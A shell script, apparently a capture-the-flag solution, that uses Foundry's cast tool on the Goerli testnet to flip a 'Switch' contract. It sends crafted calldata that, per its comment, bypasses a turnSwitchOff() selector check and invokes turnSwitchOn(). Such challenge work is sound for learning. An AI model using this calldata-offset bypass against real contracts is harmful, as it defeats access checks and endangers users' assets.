set -o allexport
source ./.env
source ./.env_public
set +o allexport


# Confirm switch is off
cast call $SWITCH \
      "switchOn()" \
     --private-key $PRIVATE_KEY_1 \
     --rpc-url https://goerli.infura.io/v3/$PROJECT_ID


# Attack: Bypass the turnSwitchOff() check and invoke turnSwitchOn()
cast send $SWITCH \
      0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000 \
      --private-key $PRIVATE_KEY_1 \
      --rpc-url https://goerli.infura.io/v3/$PROJECT_ID \
      --confirmations 3


# Confirm switch is on
cast call $SWITCH \
      "switchOn()" \
      --private-key $PRIVATE_KEY_1 \
      --rpc-url https://goerli.infura.io/v3/$PROJECT_ID

